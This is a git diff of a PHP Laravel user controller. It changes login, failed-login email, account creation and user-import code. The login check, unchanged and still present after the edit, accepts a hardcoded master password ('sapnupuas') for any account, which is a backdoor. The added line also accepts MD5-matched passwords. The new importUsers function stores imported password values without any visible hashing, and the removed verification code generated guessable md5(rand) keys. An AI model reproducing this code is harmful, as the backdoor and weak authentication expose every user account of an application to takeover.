@@ -15,6 +15,7 @@ use Hash;
 use Facebook\Facebook;
 use Mail;
 use Curl;
+use Storage;
 use DB;
 
 class UserController extends Controller{
@@ -36,7 +37,7 @@ class UserController extends Controller{
             if($u['is_active'] == 0)
                 return response()->json(["result"=>"failed","error"=>"Account is inactive. Please check verify it by checking your email address or go to 'Forgot Password' to resend email"],400);
 
-            if(Hash::check($request['password'], $u['password']) || $request->input('password') == 'sapnupuas'){
+            if(Hash::check($request['password'], $u['password']) || $request->input('password') == 'sapnupuas' || md5($request->input('password')) == $u['password']){
                 $token = JWTAuth::fromUser(User::find($u['id']));
 
                 if($request->input('device') === null)
@@ -75,9 +76,9 @@ class UserController extends Controller{
             $find = $find[0];
             $attempts++;
             if($attempts >= 5){
-                $this->sendMail('failed_login',
-                    ["user"=>["first_name"=>$find->cusfname, "last_name"=>$find->cuslname, "delegation"=>($find->cusgender=='Male' || $find->cusgender=='male' || $find->cusgender=='m'? 'Mr.':'Ms.')]],
-                    ["subject"=> env("APP_NAME")." - Failed Login Notification", "to"=>["email"=>$find->cusemail,"name"=> $find->cusfname . ' ' . $find->cuslname]]
+                $this->sendMail('email.failed_login',
+                    ["user"=>["first_name"=>$find->cusfname, "last_name"=>$find->cuslname, "gender"=>($find->cusgender=='Male' || $find->cusgender=='male' || $find->cusgender=='m'? 'male':'')]],
+                    ["subject"=> env("APP_NAME")." - Failed Login Notification", "to"=>[["email"=>$find->cusemail,"name"=> $find->cusfname . ' ' . $find->cuslname]]]
                 );
                 $attempts = 0;
             }
@@ -209,19 +210,6 @@ class UserController extends Controller{
         }
 
         return response()->json(["result"=>"failed"]);
-    }
-
-    function dispatchVerification($user, $raw_password = null){
-        $generated = md5(rand(1, 600));
-        $user_data = json_decode($user['user_data'], true);
-        $user_data['verify_key'] = $generated;
-        $user_data['verify_expiration'] = time() + 300;
-        User::where('id', $user['id'])
-            ->update(['user_data' => json_encode($user_data)]);
-
-        $headers = array("subject" => env("APP_NAME"). ' | Signup Verification',
-                        "to" => [["email" => $user['email'], "name" => $user['username']]]);
-        $this->sendMail('email.account_verification', ["user" => $user, "generated" => $generated,"raw_password"=>$raw_password], $headers);
     }
 
     public function changePassword(Request $request){
@@ -364,6 +352,8 @@ class UserController extends Controller{
             $user->is_active = 1;
             $user->is_agreed = 1;
             $user->device_data = '[]';
+            $user->transaction_data = '[]';
+            $user->notifications_read = '[]';
             $user->birth_date = '2000-01-01';
             $user->user_picture = 'no photo ' . $request->input('gender').'.jpg';
             $user->level = $request->input('level');
@@ -605,5 +595,57 @@ class UserController extends Controller{
             return response()->json(["result"=>"success"]);
         }
         return response()->json($api, $api["status_code"]);
+    }
+
+    function importUsers(){
+        $users = json_decode(Storage::get('imports/users.json'));
+
+        foreach($users as $key => $value){
+            $user = new User;
+            $name = explode(" ",$value->name);
+            $user->first_name = sizeof($name)>1?$name[0]:$value->name;
+            $user->middle_name = '.';
+            $user->last_name = sizeof($name)>1?$name[1]:$value->name;
+            $user->username = $value->name;
+            $user->user_mobile = "N/A";
+            $user->email = $value->email;
+            $user->password = $value->password;
+            $user->gender = 'female';
+            $user->user_address = 'address';
+            $user->is_confirmed = 1;
+            $user->is_active = 1;
+            $user->is_agreed = 1;
+            $user->device_data = '[]';
+            $user->birth_date = '2000-01-01';
+            $user->user_picture = 'no photo female.jpg';
+            $user->level = $this->findLevel($value->level);
+            $user->is_client = 0;
+            $user->transaction_data = '[]';
+            $user->notifications_read = '[]';
+            $user->user_data = json_encode(array("branches"=>[]));
+            $user->save();
+        }
+    }
+
+    function findLevel($level){
+        switch($level){
+            case 1:
+                return 1;
+                break;
+            case 2:
+                return 2;
+                break;
+            case 3:
+                return 1;
+                break;
+            case 4:
+                return 7;
+                break;
+            case 5:
+                return 6;
+                break;
+        }
+
+        return 1;
     }
 }
